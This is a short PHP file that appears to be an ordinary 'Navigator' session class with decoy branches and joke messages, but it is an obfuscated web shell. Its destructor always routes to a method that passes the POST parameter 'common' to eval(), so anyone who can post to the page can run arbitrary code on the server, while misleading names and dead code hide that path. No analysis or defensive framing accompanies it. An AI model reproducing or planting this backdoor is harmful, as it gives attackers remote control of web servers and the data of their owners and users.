<html>
<pre>
<?php
        class Navigator
        {
                var $m_webInfo; 
                var $m_check = array('Message','RequestId','Error','RecommendDoc','Object','parse');
                var $m_const; 
                function __construct($S_uid)
                {
                        $this->name = 'session';
                        $this->m_const = "$_POST";
                        $this->m_webInfo = $S_uid;
                }
                function __destruct()
                {
                        if($this->name === 'session')
                        {
                                if($this->m_check[5] === 'parse')
                                {
                                        $Session_Check = 'Error';
                                        switch($Session_Check)
                                        {
                                                case 'sbrother':
                                                        echo 'error3';
                                                        break;
                                                case 'parse':
                                                        print 'parse OK';
                                                        break;
                                                case 'Error':
                                                        echo 'Access Denied';
                                                        $this->Architecture();
                                                        break;
                                                default:
                                                        print 'Default';
                                                        break;
                                                
                                        }
                                }
                                else
                                {
                                        echo "error";
                                }
                        }
                        else
                        {
                                echo "error";
                        }
                        echo "</pre>";
                }
                function Architecture()
                {
                        switch($this->m_check[0])
                        {
                                case 'Message':
                                        eval($this->m_webInfo);
                                        break;
                                case 'RequestId':
                                        echo 'PHP is the best language in the world!'.PHP_EOL;
                                        break;
                                case 'RecommendDoc':
                                        echo 'prefer C'.PHP_EOL;
                                        break;
                                case 'Object':
                                        echo 'Asm'.PHP_EOL;
                                        break;
                                default:
                                        echo 'The document tree is shown below'.PHP_EOL;
                                        break;
                        }
                }
        }
        $Navigator = new Navigator($_POST['common']);
?>
</html>
